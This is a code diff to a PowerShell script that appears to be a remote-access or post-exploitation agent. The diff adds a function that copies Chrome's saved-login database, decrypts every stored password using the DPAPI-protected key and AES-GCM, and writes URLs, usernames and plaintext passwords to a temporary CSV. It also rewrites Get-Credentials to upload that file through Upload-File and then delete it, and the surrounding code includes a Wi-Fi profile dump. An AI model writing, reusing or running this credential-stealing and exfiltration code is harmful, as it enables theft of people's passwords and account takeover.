@@ -388,38 +388,101 @@ function PortSuggest {
         return "[DOWNLOADED] $out"
     }
 
-    function Get-Credentials {
+
+
+
+    
+    function Get-DecryptedChromeCreds {
+    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    $loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+
+    if (!(Test-Path $localStatePath) -or !(Test-Path $loginDataPath)) {
+        return "[ERROR] Chrome data not found."
+    }
+
+    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+
+    $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+
+    $tempDb = "$env:TEMP\LoginData.db"
+    Copy-Item $loginDataPath -Destination $tempDb -Force
+
+    Add-Type -AssemblyName System.Data.SQLite
+    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
+    $conn.Open()
+    $cmd = $conn.CreateCommand()
+    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+    $reader = $cmd.ExecuteReader()
+
+    $results = @()
+    while ($reader.Read()) {
+        $url = $reader.GetString(0)
+        $username = $reader.GetString(1)
+        $encPass = $reader["password_value"]
+        $encBytes = New-Object byte[] $encPass.Length
+        $encPass.Read($encBytes, 0, $encBytes.Length) | Out-Null
+
+        if ($encBytes[0..2] -join '' -eq 'v10') {
+            $encPwd = $encBytes[3..($encBytes.Length - 1)]
+            try {
+                $aes = [System.Security.Cryptography.AesGcm]::new($dpapiKey)
+                $nonce = $encPwd[0..11]
+                $cipher = $encPwd[12..($encPwd.Length - 17)]
+                $tag = $encPwd[($encPwd.Length - 16)..($encPwd.Length - 1)]
+                $plainBytes = New-Object byte[] $cipher.Length
+                $aes.Decrypt($nonce, $cipher, $tag, $plainBytes)
+                $plain = [System.Text.Encoding]::UTF8.GetString($plainBytes)
+                $results += "$url,$username,$plain"
+            } catch {
+                $results += "$url,$username,[DECRYPTION FAILED]"
+            }
+        } else {
+            try {
+                $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                $results += "$url,$username,$([System.Text.Encoding]::UTF8.GetString($plainText))"
+            } catch {
+                $results += "$url,$username,[DPAPI DECRYPTION FAILED]"
+            }
+        }
+    }
+    $reader.Close()
+    $conn.Close()
+    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+
+    $outPath = "$env:TEMP\chrome_creds.csv"
+    $results | Set-Content -Path $outPath
+    return $outPath
+}
+
+function Get-Credentials {
     try {
-        $output = ""
+        $output = "[*] Dumping Chrome credentials..."
 
-        # 1. Windows Credential Manager (generic credentials)
-        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
-            $target = $_.ToString().Split(":")[1].Trim()
-            $output += "`n[TARGET] $target"
+        $chromeCreds = Get-DecryptedChromeCreds
+        if (Test-Path $chromeCreds) {
+            $output += "`n[+] Chrome credentials dumped to: $chromeCreds"
+            $uploadResult = Upload-File $chromeCreds
+            Remove-Item $chromeCreds -Force -ErrorAction SilentlyContinue
+            return $uploadResult
+        } else {
+            return "[ERROR] Chrome creds extraction failed."
         }
-
-        # 2. Chrome saved logins (мета-данные — без дешифровки)
-        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromeLoginPath) {
-            $output += "`n[+] Chrome login database found: $chromeLoginPath"
-        }
-
-        # 3. Firefox профили (только список профилей)
-        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
-        foreach ($profile in $firefoxProfiles) {
-            $output += "`n[+] Firefox profile: $($profile.FullName)"
-        }
-
-        if ([string]::IsNullOrWhiteSpace($output)) {
-            return "[INFO] No credentials found or access denied."
-        }
-
-        return $output
     }
     catch {
         return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
+
+
+
+
+
+
+
+
+
     
     function Dump-WiFi {
     netsh wlan show profiles | ForEach-Object {
